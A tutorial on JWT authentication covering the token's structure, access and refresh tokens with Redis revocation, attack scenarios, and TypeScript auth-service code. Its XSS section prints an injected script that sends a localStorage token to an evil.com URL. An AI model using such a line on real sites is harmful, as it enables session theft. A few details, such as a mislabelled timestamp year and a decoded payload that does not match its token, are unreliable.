# Understanding JWT (JSON Web Tokens) - Complete Guide

## Table of Contents
1. [The Problem We're Solving](#the-problem-were-solving)
2. [What is JWT?](#what-is-jwt)
3. [How Traditional Sessions Work (The Old Way)](#how-traditional-sessions-work-the-old-way)
4. [How JWT Works (The Modern Way)](#how-jwt-works-the-modern-way)
5. [JWT Structure Explained](#jwt-structure-explained)
6. [Complete Authentication Flow](#complete-authentication-flow)
7. [Why Two Tokens? (Access + Refresh)](#why-two-tokens-access--refresh)
8. [Security Benefits](#security-benefits)
9. [Common Attack Scenarios & How JWT Protects](#common-attack-scenarios--how-jwt-protects)
10. [Code Examples from Our System](#code-examples-from-our-system)

---

## The Problem We're Solving

### Real-World Scenario

Imagine you're at an airport:

1. You check in at the counter (Login)
2. They give you a boarding pass (Token)
3. You show the boarding pass at security, gate, etc. (Authentication)
4. Each checkpoint verifies your boarding pass without calling the check-in counter

**Without JWT:** Every checkpoint would need to call the check-in counter to verify you.
**With JWT:** Your boarding pass has all the info + is tamper-proof (signature).

### The Technical Problem

```
Problem: How do we know if a user is logged in on EVERY request?

Bad Solution:
├─ Store password in every request ❌ (insecure)
├─ Check database on every request ❌ (slow)
└─ Store session in server memory ❌ (doesn't scale)

Good Solution: JWT ✅
└─ Self-contained token that proves identity
   └─ No database lookup needed
   └─ Tamper-proof (cryptographic signature)
   └─ Expires automatically
```

---

## What is JWT?

**JWT = A signed digital envelope containing information about the user**

Think of it like a sealed letter:
- **Envelope (Header)**: Says how it's sealed
- **Letter Content (Payload)**: The actual information
- **Wax Seal (Signature)**: Proves it wasn't opened/tampered with

```
Real JWT Example:
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOiIxMjMiLCJlbWFpbCI6InRlc3RAZXhhbXBsZS5jb20ifQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c

This looks random, but it's actually three parts:
HEADER.PAYLOAD.SIGNATURE
```

---

## How Traditional Sessions Work (The Old Way)

Let's understand the old approach first to appreciate JWT better.

### Step-by-Step Flow

```
┌────────────────────────────────────────────────────────────────┐
│ Step 1: User Logs In                                           │
└────────────────────────────────────────────────────────────────┘

User Browser                        Server                    Database
     │                                 │                           │
     │  POST /login                    │                           │
     │  email: test@example.com        │                           │
     │  password: mypassword           │                           │
     │────────────────────────────────>│                           │
     │                                 │                           │
     │                                 │  Check email/password     │
     │                                 │──────────────────────────>│
     │                                 │                           │
     │                                 │  ✓ Valid user             │
     │                                 │<──────────────────────────│
     │                                 │                           │
     │                                 │  CREATE session           │
     │                                 │  sessionId: "abc123"      │
     │                                 │  userId: "user-1"         │
     │                                 │──────────────────────────>│
     │                                 │                           │
     │  Set-Cookie: sessionId=abc123   │                           │
     │<────────────────────────────────│                           │
     │                                 │                           │
     │  Browser saves cookie           │                           │


┌────────────────────────────────────────────────────────────────┐
│ Step 2: User Makes a Request (Get Projects)                    │
└────────────────────────────────────────────────────────────────┘

User Browser                        Server                    Database
     │                                 │                           │
     │  GET /api/projects              │                           │
     │  Cookie: sessionId=abc123       │                           │
     │────────────────────────────────>│                           │
     │                                 │                           │
     │                                 │  Who is sessionId=abc123? │
     │                                 │──────────────────────────>│
     │                                 │                           │
     │                                 │  userId: "user-1"         │
     │                                 │<──────────────────────────│
     │                                 │                           │
     │                                 │  Get projects for user-1  │
     │                                 │──────────────────────────>│
     │                                 │                           │
     │  { projects: [...] }            │                           │
     │<────────────────────────────────│                           │


┌────────────────────────────────────────────────────────────────┐
│ Step 3: EVERY Request Needs Database Lookup! ❌                │
└────────────────────────────────────────────────────────────────┘

Request 1: GET /api/projects  → DB lookup (who is abc123?)
Request 2: POST /api/tasks    → DB lookup (who is abc123?)
Request 3: GET /api/tasks     → DB lookup (who is abc123?)
Request 4: PATCH /api/tasks/1 → DB lookup (who is abc123?)
...100 more requests          → 100 more DB lookups! 😰
```

### Problems with Traditional Sessions

1. **Database Bottleneck**: Every request needs a DB lookup
   ```
   1000 users × 100 requests/minute = 100,000 DB queries/minute just for auth!
   ```

2. **Memory Issues**: Server needs to store all active sessions
   ```
   10,000 online users = 10,000 sessions stored in memory
   ``` 

3. **Scaling Problems**: Can't easily add more servers
   ```
   User logs in to Server 1
   Next request goes to Server 2
   Server 2: "I don't have your session!" ❌

   Solution: Sticky sessions (ties user to one server) = Not ideal
   ```

4. **Microservices Hell**: Each service needs to check sessions
   ```
   Auth Service → Project Service → Task Service
   Each service needs to call Auth Service or share session DB 😰
   ```

---

## How JWT Works (The Modern Way)

### The Big Idea

> "Instead of storing who you are on the server, I'll give you a tamper-proof ID card that proves who you are. Show me this card with every request."

### Step-by-Step Flow

```
┌────────────────────────────────────────────────────────────────┐
│ Step 1: User Logs In                                           │
└────────────────────────────────────────────────────────────────┘

User Browser                        Server
     │                                 │
     │  POST /login                    │
     │  email: test@example.com        │
     │  password: mypassword           │
     │────────────────────────────────>│
     │                                 │
     │                                 │  ✓ Check password (DB lookup)
     │                                 │
     │                                 │  CREATE JWT TOKEN:
     │                                 │  {
     │                                 │    userId: "user-1",
     │                                 │    email: "test@example.com",
     │                                 │    exp: timestamp
     │                                 │  }
     │                                 │  + Sign with SECRET_KEY
     │                                 │
     │  {                              │
     │    accessToken: "eyJhbGci...",  │
     │    refreshToken: "eyJhbGci..."  │
     │  }                              │
     │<────────────────────────────────│
     │                                 │
     │  Store tokens in localStorage   │


┌────────────────────────────────────────────────────────────────┐
│ Step 2: User Makes a Request (Get Projects)                    │
└────────────────────────────────────────────────────────────────┘

User Browser                        Server
     │                                 │
     │  GET /api/projects              │
     │  Authorization: Bearer eyJhbG...│
     │────────────────────────────────>│
     │                                 │
     │                                 │  VERIFY TOKEN:
     │                                 │  1. Check signature (tampered?)
     │                                 │  2. Check expiration (expired?)
     │                                 │  3. Extract userId from token
     │                                 │
     │                                 │  ✓ Valid! userId = "user-1"
     │                                 │  NO DATABASE LOOKUP NEEDED! 🎉
     │                                 │
     │  { projects: [...] }            │
     │<────────────────────────────────│


┌────────────────────────────────────────────────────────────────┐
│ Step 3: Every Request is Fast! ✅                              │
└────────────────────────────────────────────────────────────────┘

Request 1: GET /api/projects  → Verify signature (milliseconds) ✅
Request 2: POST /api/tasks    → Verify signature (milliseconds) ✅
Request 3: GET /api/tasks     → Verify signature (milliseconds) ✅
Request 4: PATCH /api/tasks/1 → Verify signature (milliseconds) ✅
...100 more requests          → 100 signature verifications! ⚡

NO DATABASE LOOKUPS FOR AUTH!
```

---

## JWT Structure Explained

### The Three Parts

A JWT looks like this:
```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOiIxMjMiLCJlbWFpbCI6InRlc3RAZXhhbXBsZS5jb20iLCJpYXQiOjE2ODAwMDAwMDAsImV4cCI6MTY4MDAwMzYwMH0.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c

Let's break it apart:

┌─────────────────────────────────┐
│ PART 1: HEADER                  │
└─────────────────────────────────┘
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9

Decoded:
{
  "alg": "HS256",      ← Algorithm used to create signature
  "typ": "JWT"         ← Type of token
}

┌─────────────────────────────────┐
│ PART 2: PAYLOAD (The data)      │
└─────────────────────────────────┘
eyJ1c2VySWQiOiIxMjMiLCJlbWFpbCI6InRlc3RAZXhhbXBsZS5jb20iLCJpYXQiOjE2ODAwMDAwMDAsImV4cCI6MTY4MDAwMzYwMH0

Decoded:
{
  "userId": "user-1",
  "email": "test@example.com",
  "iat": 1680000000,   ← Issued at (timestamp)
  "exp": 1680003600    ← Expires at (timestamp)
}

This is YOUR DATA - anyone can decode and read this!
(That's why we don't put sensitive info like passwords here)

┌─────────────────────────────────┐
│ PART 3: SIGNATURE (The seal)    │
└─────────────────────────────────┘
SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c

Created by:
HMACSHA256(
  base64(header) + "." + base64(payload),
  SECRET_KEY  ← Only the server knows this!
)

This is the MAGIC! It proves the token is authentic.
```

### How Signature Verification Works

```
┌─────────────────────────────────────────────────────────────────┐
│ Scenario 1: Valid Token ✅                                      │
└─────────────────────────────────────────────────────────────────┘

Hacker tries to read the token:
Token: eyJhbGci...
Decoded payload: { userId: "user-1", email: "test@example.com" }

Hacker can READ it! But...


┌─────────────────────────────────────────────────────────────────┐
│ Scenario 2: Hacker Tries to Modify Token ❌                     │
└─────────────────────────────────────────────────────────────────┘

Hacker changes the payload:
Original: { userId: "user-1", email: "test@example.com" }
Changed:  { userId: "admin", email: "hacker@evil.com" }

Hacker sends modified token to server:
eyJhbGci...MODIFIED_PAYLOAD...OLD_SIGNATURE

Server verification:
1. Decode payload: { userId: "admin", ... }
2. Create new signature from payload
3. Compare with token's signature
4. NEW_SIGNATURE !== OLD_SIGNATURE ❌
5. REJECT TOKEN!

Why? Hacker doesn't know the SECRET_KEY, so can't create valid signature!
```

### The Secret Key

```
┌──────────────────────────────────────────────────────────────┐
│ Why is the SECRET_KEY so important?                          │
└──────────────────────────────────────────────────────────────┘

SECRET_KEY = "my-super-secret-key-12345"

Creating a signature:
signature = HMAC-SHA256(header + payload, SECRET_KEY)

Without SECRET_KEY, you CANNOT create a valid signature!

It's like:
- A stamp that only the government can create
- A lock that only you have the key to
- A signature only you can write

If SECRET_KEY leaks:
❌ Anyone can create valid tokens
❌ Full system compromise
✅ Must rotate the key immediately
```

---

## Complete Authentication Flow

Let me show you EVERY step in our system, from registration to logout.

### 1. User Registration

```
┌─────────────────────────────────────────────────────────────────┐
│ POST /api/auth/register                                         │
│ { email, password, firstName, lastName }                        │
└─────────────────────────────────────────────────────────────────┘

Step 1: Hash the password
─────────────────────────
Plain password: "mypassword123"
↓ bcrypt.hash()
Hashed: "$2a$10$N9qo8uLOickgx2Z..." (irreversible!)

Stored in DB:
{
  id: "user-1",
  email: "test@example.com",
  password: "$2a$10$N9qo8uLO...",  ← Hashed, not plain!
  firstName: "John",
  lastName: "Doe"
}


Step 2: Generate Access Token (15 min lifespan)
────────────────────────────────────────────────
const accessToken = jwt.sign(
  { userId: "user-1", email: "test@example.com" },
  "JWT_SECRET",
  { expiresIn: "15m" }
);

Result: "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."


Step 3: Generate Refresh Token (7 day lifespan)
────────────────────────────────────────────────
const refreshToken = jwt.sign(
  { userId: "user-1", email: "test@example.com" },
  "REFRESH_TOKEN_SECRET",  ← Different secret!
  { expiresIn: "7d" }
);

Result: "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."


Step 4: Store Refresh Token in Redis
─────────────────────────────────────
Redis:
  Key: "refresh_token:user-1"
  Value: "eyJhbGci..." (the refresh token)
  TTL: 604800 seconds (7 days)

Why Redis?
- So we can DELETE it (logout)
- So we can INVALIDATE it (security breach)
- Fast lookup (in-memory database)


Step 5: Return Both Tokens to Client
─────────────────────────────────────
Response:
{
  "user": {
    "id": "user-1",
    "email": "test@example.com",
    "firstName": "John",
    "lastName": "Doe"
  },
  "accessToken": "eyJhbGci...",
  "refreshToken": "eyJhbGci..."
}

Client stores both tokens (localStorage or memory)
```

### 2. Making Authenticated Requests

```
┌─────────────────────────────────────────────────────────────────┐
│ GET /api/projects                                               │
│ Authorization: Bearer eyJhbGci...                               │
└─────────────────────────────────────────────────────────────────┘

Server receives request:
────────────────────────

const token = req.headers.authorization.split(' ')[1];
// token = "eyJhbGci..."


Step 1: Verify Token Signature
───────────────────────────────
try {
  const decoded = jwt.verify(token, "JWT_SECRET");
  // If signature is invalid or tampered: throws error
  // If token is expired: throws error
  // If valid: returns decoded payload
} catch (error) {
  return 401 Unauthorized
}


Step 2: Extract User Info from Token
─────────────────────────────────────
decoded = {
  userId: "user-1",
  email: "test@example.com",
  iat: 1680000000,
  exp: 1680003600
}

We now know WHO the user is without database lookup! 🎉


Step 3: Process Request
───────────────────────
// Get projects for this user
const projects = await db.projects.find({ userId: decoded.userId });

// Return projects
return { projects };


Total Time: ~5ms (signature verification only)
Traditional Session: ~50-100ms (DB lookup + query)
```

### 3. Token Expiration & Refresh Flow

```
┌─────────────────────────────────────────────────────────────────┐
│ Scenario: Access Token Expires After 15 Minutes                │
└─────────────────────────────────────────────────────────────────┘

Client makes request after 20 minutes:
───────────────────────────────────────

GET /api/projects
Authorization: Bearer eyJhbGci... (expired token)


Server:
───────
jwt.verify(token, "JWT_SECRET")
↓
Token expired! (exp: 1680000900, now: 1680001200)
↓
Return 401 Unauthorized
{
  "success": false,
  "message": "Token expired"
}


Client receives 401:
────────────────────
if (response.status === 401 && response.message === "Token expired") {
  // Try to refresh the token
  const newAccessToken = await refreshAccessToken();
  // Retry the request with new token
}


Client calls Refresh Endpoint:
───────────────────────────────
POST /api/auth/refresh
{
  "refreshToken": "eyJhbGci..." (the 7-day token)
}


Server Refresh Process:
───────────────────────

Step 1: Verify refresh token signature
const decoded = jwt.verify(refreshToken, "REFRESH_TOKEN_SECRET");
// If invalid or expired: throw error

Step 2: Check if token exists in Redis
const stored = await redis.get(`refresh_token:${decoded.userId}`);
if (stored !== refreshToken) {
  throw new Error("Invalid refresh token");
}
// This prevents reusing old refresh tokens

Step 3: Generate NEW access token
const newAccessToken = jwt.sign(
  { userId: decoded.userId, email: decoded.email },
  "JWT_SECRET",
  { expiresIn: "15m" }
);

Step 4: Return new access token
return { accessToken: newAccessToken };


Client gets new token:
──────────────────────
{
  "accessToken": "eyJhbGci..." (new token, valid for 15 min)
}

Client retries original request:
─────────────────────────────────
GET /api/projects
Authorization: Bearer eyJhbGci... (NEW token)
↓
✓ Success!
```

### 4. Logout Flow

```
┌─────────────────────────────────────────────────────────────────┐
│ POST /api/auth/logout                                           │
└─────────────────────────────────────────────────────────────────┘

Client:
───────
POST /api/auth/logout
Authorization: Bearer eyJhbGci...
{
  "userId": "user-1"
}


Server:
───────

Step 1: Extract userId from token
const { userId } = jwt.verify(token, "JWT_SECRET");


Step 2: Delete refresh token from Redis
await redis.del(`refresh_token:${userId}`);

Redis before:
  refresh_token:user-1 → "eyJhbGci..."

Redis after:
  (key deleted)


Step 3: Return success
return { success: true, message: "Logout successful" };


What happens now?
─────────────────

❌ Access token still valid (until it expires in 15 min)
   - Can't be invalidated (stateless)
   - But expires quickly, so limited risk

❌ Refresh token is now useless
   - Deleted from Redis
   - Even if not expired, can't be used to get new access tokens

✓ User must login again to get new tokens
```

---

## Why Two Tokens? (Access + Refresh)

### The Security Dilemma

```
┌──────────────────────────────────────────────────────────────┐
│ Problem: How long should a token last?                       │
└──────────────────────────────────────────────────────────────┘

Option 1: Long-lived token (7 days)
──────────────────────────────────
✓ User doesn't need to login often (good UX)
❌ If stolen, hacker has access for 7 days (bad security)
❌ Can't be revoked (stateless JWT)

Option 2: Short-lived token (15 minutes)
─────────────────────────────────────────
✓ If stolen, expires quickly (good security)
❌ User must login every 15 minutes (terrible UX)

Solution: Use BOTH! 🎉
──────────────────────
Access Token: Short-lived (15 min) - used for every request
Refresh Token: Long-lived (7 days) - used only to get new access tokens
```

### How It Works Together

```
┌─────────────────────────────────────────────────────────────────┐
│ The Two-Token System                                            │
└─────────────────────────────────────────────────────────────────┘

Access Token:
─────────────
- Expires: 15 minutes
- Used: Every API request
- Stored: Client memory (not sent to server on login)
- If stolen: Limited damage (expires soon)
- Can be revoked? NO (stateless)

Refresh Token:
──────────────
- Expires: 7 days
- Used: Only to get new access tokens
- Stored: Redis (server) + Client storage
- If stolen: Can be invalidated in Redis
- Can be revoked? YES (stored in Redis)


Timeline:
─────────

0 min:  Login → Get both tokens
15 min: Access token expires
        ↓
        Client: Use refresh token to get new access token
        ↓
        New access token (valid for 15 min)

30 min: Access token expires again
        ↓
        Use refresh token again

7 days: Refresh token expires
        ↓
        User must login again
```

### Visual Comparison

```
┌─────────────────────────────────────────────────────────────────┐
│ Scenario: Token Gets Stolen                                     │
└─────────────────────────────────────────────────────────────────┘

If ACCESS TOKEN stolen:
───────────────────────

Hacker has: 15 minutes of access
You can: Nothing (token is stateless)
Damage: Limited (expires quickly)
Solution: User logs out → refresh token deleted → access token useless in 15 min


If REFRESH TOKEN stolen:
────────────────────────

Hacker has: Ability to generate access tokens for 7 days
You can: Delete refresh token from Redis
Damage: Stopped immediately
Solution: User reports suspicious activity → admin deletes from Redis


If BOTH tokens stolen:
──────────────────────

Hacker has: Current access + ability to refresh
You can: Delete refresh token from Redis
Damage: Limited to current access token's lifespan (15 min)
Solution: Delete from Redis → hacker can't refresh → access expires in 15 min
```

### Why Store Refresh Token in Redis?

```
┌──────────────────────────────────────────────────────────────┐
│ Pure JWT vs JWT + Redis Hybrid                               │
└──────────────────────────────────────────────────────────────┘

Pure JWT (No Redis):
─────────────────────
✓ Completely stateless
❌ Cannot revoke tokens
❌ Cannot logout properly
❌ If token leaks, you're screwed until expiration

JWT + Redis Hybrid (Our Approach):
───────────────────────────────────
✓ Access tokens are stateless (fast)
✓ Refresh tokens can be revoked (secure)
✓ Proper logout functionality
✓ Can invalidate sessions immediately
✓ Best of both worlds!


Redis Structure:
────────────────
Key: "refresh_token:user-1"
Value: "eyJhbGci..." (the actual refresh token)
TTL: 604800 seconds (auto-delete after 7 days)

Operations:
- SET: When user logs in
- GET: When user tries to refresh
- DEL: When user logs out
- Expires: Automatically after 7 days
```

---

## Security Benefits

### 1. Password Never Leaves the Server

```
Traditional Mistake:
────────────────────
return {
  user: {
    id: "user-1",
    email: "test@example.com",
    password: "mypassword123"  ❌ NEVER DO THIS!
  }
}

Our Implementation:
───────────────────
// Password is hashed before storing
const hashedPassword = await bcrypt.hash(password, 10);

// Password is NEVER selected in queries
prisma.user.create({
  data: { email, password: hashedPassword, ... },
  select: { id: true, email: true, firstName: true, lastName: true }
  // Notice: password is NOT in select!
});

// Even the hash is never returned
return {
  user: {
    id: "user-1",
    email: "test@example.com"
    // No password field at all ✓
  }
}
```

### 2. Separate Secrets for Different Tokens

```
Why Two Different Secrets?
──────────────────────────

JWT_SECRET = "secret-key-1"              → Access tokens
REFRESH_TOKEN_SECRET = "secret-key-2"    → Refresh tokens


If one secret is compromised:
─────────────────────────────

Scenario: Access token secret leaks
❌ Attacker can create fake access tokens
✓ Refresh tokens still secure (different secret)
✓ Rotate access token secret
✓ All users must refresh (they have valid refresh tokens)
✓ Damage contained


Scenario: Refresh token secret leaks
❌ Attacker can create fake refresh tokens
✓ Access tokens still working
✓ Delete all refresh tokens from Redis
✓ Rotate refresh token secret
✓ All users must login again
```

### 3. Token Expiration

```
Built-in Expiration:
────────────────────

Token payload:
{
  userId: "user-1",
  email: "test@example.com",
  iat: 1680000000,  ← Issued at: March 28, 2024 00:00:00
  exp: 1680000900   ← Expires at: March 28, 2024 00:15:00
}

Current time: 1680001000 (March 28, 2024 00:16:40)

Verification:
if (currentTime > exp) {
  throw new Error("Token expired");
}

Benefits:
✓ Automatic expiration (no manual tracking)
✓ Can't be bypassed (checked in verification)
✓ Reduces damage from stolen tokens
```

### 4. Tamper-Proof Signature

```
How Signature Prevents Tampering:
──────────────────────────────────

Original Token:
Header: { alg: "HS256", typ: "JWT" }
Payload: { userId: "user-1", email: "test@example.com" }
Signature: HMAC-SHA256(header + payload, SECRET_KEY)
Result: "abc123xyz..."


Attacker Changes Payload:
─────────────────────────
Payload: { userId: "admin", email: "hacker@evil.com" }

Attacker's Options:
───────────────────

Option 1: Keep old signature
Token: HEADER.MODIFIED_PAYLOAD.OLD_SIGNATURE
Server: HMAC-SHA256(header + MODIFIED_PAYLOAD, SECRET_KEY)
        → "def456uvw..." (NEW signature)
        OLD_SIGNATURE !== NEW_SIGNATURE ❌ REJECTED!

Option 2: Try to create new signature
Problem: Don't know SECRET_KEY
Can't create valid signature ❌ REJECTED!

Option 3: Try to brute force SECRET_KEY
Problem: Would take billions of years with strong key
Practically impossible ❌


Conclusion:
───────────
✓ Signature makes token tamper-proof
✓ Any modification invalidates the token
✓ Only server with SECRET_KEY can create valid tokens
```

---

## Common Attack Scenarios & How JWT Protects

### Attack 1: Man-in-the-Middle (MITM)

```
Scenario:
─────────
Hacker intercepts network traffic and steals the JWT token.

┌─────┐   Token: eyJhbG...   ┌────────┐
│User │ ─────────────────────>│ Hacker │
└─────┘                       └────────┘
                                  ↓
                              Captured!


What can hacker do?
───────────────────
✓ Use the token to make requests (impersonate user)
✓ Read the token contents (userId, email)
❌ Cannot modify token (signature prevents it)
❌ Cannot extend expiration (signature prevents it)


Protection in our system:
─────────────────────────
1. Short expiration (15 min) - Limited time window
2. HTTPS only (TLS encryption) - Prevents interception
3. Refresh token in Redis - Can be revoked immediately

User reports suspicious activity:
Admin deletes refresh token from Redis → Hacker loses access in 15 min
```

### Attack 2: Token Modification

```
Scenario:
─────────
Hacker tries to change userId from "user-1" to "admin".

Original Token Payload:
{
  userId: "user-1",
  email: "test@example.com"
}

Modified Token Payload:
{
  userId: "admin",  ← Changed!
  email: "hacker@evil.com"
}


What happens:
─────────────

Step 1: Hacker modifies payload
HEADER.MODIFIED_PAYLOAD.OLD_SIGNATURE

Step 2: Hacker sends to server
POST /api/admin/users
Authorization: Bearer HEADER.MODIFIED_PAYLOAD.OLD_SIGNATURE

Step 3: Server verifies
const expectedSignature = HMAC-SHA256(
  HEADER + MODIFIED_PAYLOAD,
  SECRET_KEY
);

if (expectedSignature !== OLD_SIGNATURE) {
  throw new Error("Invalid signature"); ❌ REJECTED!
}


Why it fails:
─────────────
The signature was created for the ORIGINAL payload.
When payload changes, signature no longer matches.
Without SECRET_KEY, hacker can't create valid signature.
```

### Attack 3: Token Replay

```
Scenario:
─────────
Hacker steals a valid token and reuses it later.

┌─────┐                        ┌────────┐
│User │ ─────login────────────>│ Server │
└─────┘                        └────────┘
  ↓                                ↓
Token: eyJhbG...              (Token sent)
  ↓
Hacker intercepts and saves token
  ↓
3 days later...
  ↓
┌────────┐  Token: eyJhbG...  ┌────────┐
│ Hacker │ ───────────────────>│ Server │
└────────┘                     └────────┘


What happens:
─────────────

If access token (15 min lifespan):
Server verifies token
Token expired! (3 days > 15 min)
❌ REJECTED!

If refresh token:
Server verifies token
Checks Redis: Does token exist?
User logged out → Token deleted from Redis
❌ REJECTED!


Protection:
───────────
✓ Short expiration on access tokens
✓ Refresh tokens stored in Redis (can be deleted)
✓ User logout invalidates refresh token
```

### Attack 4: Brute Force SECRET_KEY

```
Scenario:
─────────
Hacker tries to guess the SECRET_KEY to create fake tokens.

Weak Key:
─────────
SECRET_KEY = "12345"

Attacker can try:
"1", "12", "123", "1234", "12345" ✓ FOUND!
Time: Minutes

Strong Key (Our approach):
──────────────────────────
SECRET_KEY = "a9f8j3k2l1m0n4p5q6r7s8t9u0v1w2x3y4z5"

Possible combinations: 36^36 = 10^55
Time to crack: Billions of years

Protection:
───────────
✓ Use long, random SECRET_KEY (64+ characters)
✓ Include numbers, letters, special characters
✓ Store in environment variables (never in code)
✓ Rotate periodically
```

### Attack 5: XSS (Cross-Site Scripting)

```
Scenario:
─────────
Hacker injects malicious JavaScript to steal tokens from localStorage.

Vulnerable Code:
────────────────
// Storing token in localStorage
localStorage.setItem('accessToken', token);

// Hacker injects script
<script>
  const token = localStorage.getItem('accessToken');
  fetch('https://evil.com/steal?token=' + token);
</script>


Protection Strategies:
──────────────────────

1. HttpOnly Cookies (Best for refresh tokens):
──────────────────────────────────────────────
Set-Cookie: refreshToken=eyJhbG...; HttpOnly; Secure; SameSite=Strict

✓ JavaScript cannot access the cookie
✓ Prevents XSS attacks
✓ Automatically sent with requests

2. Memory Storage (Best for access tokens):
───────────────────────────────────────────
// Store in memory (not localStorage)
let accessToken = null; // In React: useState

✓ Not accessible via XSS
✓ Lost on page refresh (use refresh token to get new one)

3. Content Security Policy (CSP):
─────────────────────────────────
Content-Security-Policy: script-src 'self';

✓ Prevents inline scripts
✓ Blocks external script injection
```

---

## Code Examples from Our System

### Registration Flow

```typescript
// File: apps/auth-service/src/services/auth.service.ts

async register(data: RegisterData): Promise<AuthResponse> {
  // 1. Check if user exists
  const existingUser = await prisma.user.findUnique({
    where: { email: data.email }
  });

  if (existingUser) {
    throw new Error('User with this email already exists');
  }

  // 2. Hash password (one-way encryption)
  const hashedPassword = await hashPassword(data.password);
  // Plain: "mypassword123"
  // Hashed: "$2a$10$N9qo8uLOickgx2Z..." (irreversible!)

  // 3. Create user in database
  const user = await prisma.user.create({
    data: {
      email: data.email,
      password: hashedPassword,  // ← Hashed password
      firstName: data.firstName,
      lastName: data.lastName,
    },
    select: {
      id: true,
      email: true,
      firstName: true,
      lastName: true,
      avatar: true,
      // ← Notice: password is NOT selected!
    },
  });

  // 4. Generate access token (15 min)
  const accessToken = generateAccessToken({
    userId: user.id,
    email: user.email,
  });
  // Result: "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."

  // 5. Generate refresh token (7 days)
  const refreshToken = generateRefreshToken({
    userId: user.id,
    email: user.email,
  });
  // Result: "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..." (different secret!)

  // 6. Store refresh token in Redis
  await this.storeRefreshToken(user.id, refreshToken);
  // Redis: Key="refresh_token:user-1", Value=token, TTL=7days

  // 7. Return everything to client
  return {
    user,           // User info (no password!)
    accessToken,    // For API requests
    refreshToken,   // To get new access tokens
  };
}
```

### Token Generation

```typescript
// File: apps/auth-service/src/utils/jwt.ts

export const generateAccessToken = (payload: TokenPayload): string => {
  return jwt.sign(
    payload,                              // Data to encode
    process.env.JWT_SECRET!,              // Secret key
    { expiresIn: '15m' }                  // Expires in 15 minutes
  );
};

// What happens inside jwt.sign():
// ────────────────────────────────
//
// Step 1: Create header
// {
//   "alg": "HS256",
//   "typ": "JWT"
// }
//
// Step 2: Add payload + timestamps
// {
//   "userId": "user-1",
//   "email": "test@example.com",
//   "iat": 1680000000,  ← Added automatically
//   "exp": 1680000900   ← iat + 15 minutes
// }
//
// Step 3: Create signature
// signature = HMAC-SHA256(
//   base64(header) + "." + base64(payload),
//   "JWT_SECRET"
// )
//
// Step 4: Combine all three
// base64(header) + "." + base64(payload) + "." + signature
//
// Result: "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOi..."
```

### Token Verification

```typescript
// File: apps/auth-service/src/utils/jwt.ts

export const verifyAccessToken = (token: string): TokenPayload => {
  return jwt.verify(token, process.env.JWT_SECRET!) as TokenPayload;
};

// What happens inside jwt.verify():
// ──────────────────────────────────
//
// Step 1: Split token into three parts
// const [header, payload, signature] = token.split('.');
//
// Step 2: Recreate signature from header + payload
// const expectedSignature = HMAC-SHA256(
//   header + "." + payload,
//   "JWT_SECRET"
// );
//
// Step 3: Compare signatures
// if (expectedSignature !== signature) {
//   throw new Error("Invalid signature"); ❌
// }
//
// Step 4: Check expiration
// const decoded = base64Decode(payload);
// if (Date.now() > decoded.exp * 1000) {
//   throw new Error("Token expired"); ❌
// }
//
// Step 5: Return payload if all checks pass
// return decoded; ✓
```

### Refresh Token Flow

```typescript
// File: apps/auth-service/src/services/auth.service.ts

async refreshAccessToken(refreshToken: string): Promise<{ accessToken: string }> {
  try {
    // Step 1: Verify refresh token signature & expiration
    const payload = verifyRefreshToken(refreshToken);
    // If signature invalid: throws error
    // If expired: throws error
    // If valid: returns { userId, email }

    // Step 2: Check if token exists in Redis
    const storedToken = await redisClient.get(`refresh_token:${payload.userId}`);

    if (!storedToken) {
      // Token not in Redis (user logged out or never existed)
      throw new Error('Invalid refresh token');
    }

    if (storedToken !== refreshToken) {
      // Token in Redis doesn't match provided token
      // (prevents reusing old refresh tokens)
      throw new Error('Invalid refresh token');
    }

    // Step 3: All checks passed! Generate new access token
    const accessToken = generateAccessToken({
      userId: payload.userId,
      email: payload.email,
    });

    return { accessToken };
  } catch (error) {
    throw new Error('Invalid or expired refresh token');
  }
}

// Why check Redis?
// ────────────────
// 1. User can logout (deletes token from Redis)
// 2. Admin can revoke access (deletes token from Redis)
// 3. Security breach (delete all tokens from Redis)
// 4. Prevents token reuse (only one refresh token valid at a time)
```

### Logout Flow

```typescript
// File: apps/auth-service/src/services/auth.service.ts

async logout(userId: string): Promise<void> {
  // Delete refresh token from Redis
  await redisClient.del(`refresh_token:${userId}`);

  // That's it! Simple but effective.
  //
  // What this does:
  // ─────────────
  // 1. User's access token still works (until it expires in 15 min)
  // 2. User's refresh token becomes useless (deleted from Redis)
  // 3. After 15 min, user can't get new access token (refresh token invalid)
  // 4. User must login again to get new tokens
  //
  // Why access token still works:
  // ─────────────────────────────
  // It's stateless! Server doesn't store it anywhere.
  // We COULD maintain a blacklist, but:
  // - Adds complexity
  // - Requires database lookup (defeats purpose of JWT)
  // - 15 min window is acceptable risk
}
```

---

## Summary

### Key Takeaways

1. **JWT = Self-contained proof of identity**
   - No database lookup needed for authentication
   - Fast verification (just signature check)
   - Scales easily (stateless)

2. **Two-token system = Security + UX**
   - Access token (15 min): Fast, frequent use
   - Refresh token (7 days): Secure, stored in Redis, can be revoked

3. **Security through cryptography**
   - Signature prevents tampering
   - Expiration limits damage from theft
   - Separate secrets for different token types
   - Redis storage allows revocation

4. **Trade-offs made**
   - Access token can't be revoked (stateless) → short expiration
   - Refresh token can be revoked (stored in Redis) → longer expiration
   - Best of both worlds!

### When to Use JWT

✅ **Good for:**
- Microservices architecture
- Stateless APIs
- Mobile apps
- Cross-domain authentication
- High-performance systems

❌ **Maybe not ideal for:**
- Systems requiring instant token revocation
- Simple single-server applications
- Cases where session data is frequently updated

---

## Next Steps

Now that you understand JWT, here's what we'll build next:

1. **Authentication Middleware** - Automatically verify tokens on protected routes
2. **Authorization Middleware** - Check if user has required roles/permissions
3. **Rate Limiting** - Prevent brute force attacks
4. **Password Reset Flow** - Using JWT for secure reset tokens

